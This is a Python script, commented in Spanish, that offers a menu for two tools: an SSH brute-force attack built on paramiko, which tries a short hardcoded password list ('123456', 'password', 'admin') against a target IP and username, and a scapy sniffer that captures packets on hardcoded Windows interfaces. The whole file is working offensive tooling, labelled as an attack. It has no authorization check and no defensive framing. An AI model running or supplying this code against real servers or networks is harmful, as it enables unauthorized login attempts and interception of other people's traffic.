import logging
import paramiko
import scapy.all as scapy

# Configuración básica del logging
logging.basicConfig(filename='app.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Esta función realiza un ataque de fuerza bruta a un servidor SSH
def ssh_bruteforce(target_ip, username, password_list):
    ssh = paramiko.SSHClient()  # Crear un cliente SSH
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  

    # Intentar conectar con cada contraseña de la lista
    for password in password_list:
        try:
            ssh.connect(target_ip, username=username, password=password, timeout=5)  
            print(f"¡Contraseña encontrada!: {password}") 
            logging.info(f"Contraseña correcta encontrada: {password}")  
            return True  # Salir si se encuentra la contraseña
        except paramiko.AuthenticationException:
            print(f"Contraseña fallida: {password}")  
            logging.warning(f"Autenticación fallida con la contraseña: {password}")  
        except paramiko.SSHException as ssh_exc:
            print(f"Error de SSH: {ssh_exc}")  
            logging.error(f"Error de SSH: {ssh_exc}")  
        except Exception as e:
            print(f"Error: {e}")  
            logging.error(f"Error durante la conexión: {e}")  
        finally:
            ssh.close()  

    print("No se encontró la contraseña correcta.")  
    logging.info("No se pudo encontrar una contraseña válida.")  
    return False

# Esta función captura paquetes y muestra su resumen
def capture_packets(packet):
    print(packet.summary())  
    logging.info(f"Paquete capturado: {packet.summary()}")  

# Esta función inicia la captura de paquetes en la interfaz especificada
def start_capture(interface, packet_count):
    # Verificar que la interfaz y el número de paquetes son válidos
    if not interface or packet_count <= 0:
        print("La interfaz no puede estar vacía y el número de paquetes debe ser mayor que 0.")
        return

    print(f"Iniciando captura de {packet_count} paquetes en la interfaz {interface}...")
    try:
        scapy.sniff(iface=interface, prn=capture_packets, count=packet_count)  
        print("Captura completada.")  # Informar que la captura ha finalizado
    except Exception as e:
        print(f"Error durante la captura de paquetes: {e}")  

# Esta función lista las interfaces de red disponibles
def list_interfaces():
    interfaces = {
        'Wi-Fi': '\\Device\\NPF_{3237270A-8FF9-457B-AA5F-FA7E16DC0ED6}',  
        'Ethernet': '\\Device\\NPF_{62517ECD-C21F-4946-BC87-EA5E795F4880}',  
    }
    return interfaces  # Retornar el diccionario de interfaces

# Esta función muestra el menú principal y gestiona las opciones del usuario
def show_main_menu():
    while True:
        print("\nBienvenido al menú principal:")
        print("1. Realizar ataque de fuerza bruta SSH")
        print("2. Iniciar captura de paquetes")
        print("3. Salir")

        try:
            option = int(input("Selecciona una opción (1, 2 o 3): "))  
            if option == 1:
                run_ssh_bruteforce()  
            elif option == 2:
                run_capture()  
            elif option == 3:
                print("Saliendo...")  
                break  # Salir del bucle
            else:
                print("Opción no válida. Por favor, selecciona 1, 2 o 3.")  
                logging.warning("El usuario seleccionó una opción no válida.")
        except ValueError:
            print("Por favor, ingresa un número válido.")  
            logging.error("El usuario ingresó un valor no numérico.")

# Esta función obtiene los datos del usuario y ejecuta el ataque de fuerza bruta
def run_ssh_bruteforce():
    target_ip = input("IP del servidor SSH: ") 
    username = input("Nombre de usuario: ")  
    
    # Validar que el nombre de usuario no esté vacío
    if not username:
        print("El nombre de usuario no puede estar vacío.")  
        logging.error("El nombre de usuario está vacío.")  
        return

    # Lista de contraseñas para probar
    password_list = ["123456", "password", "admin"]  
    ssh_bruteforce(target_ip, username, password_list)

# Esta función ejecuta el proceso de captura de paquetes
def run_capture():
    print("Interfaces de red disponibles:")
    interfaces = list_interfaces()  
    for name, iface in interfaces.items():
        print(f"- {name} (Interface: {iface})")  

    iface_name = input("Introduce la interfaz de red a utilizar (por ejemplo, 'Wi-Fi'): ").strip()  
    iface = interfaces.get(iface_name)  

    if iface is None:
        print(f"Error: La interfaz '{iface_name}' no se encuentra en la lista de interfaces disponibles.")
        return

    try:
        packet_count = int(input("Introduce el número de paquetes a capturar: "))  
    except ValueError:
        print("Por favor, ingresa un número válido para el número de paquetes.")
        return

    start_capture(iface, packet_count)  # Iniciar la captura de paquetes

# Mostrar el menú principal al ejecutar el script
if __name__ == "__main__":
    show_main_menu()
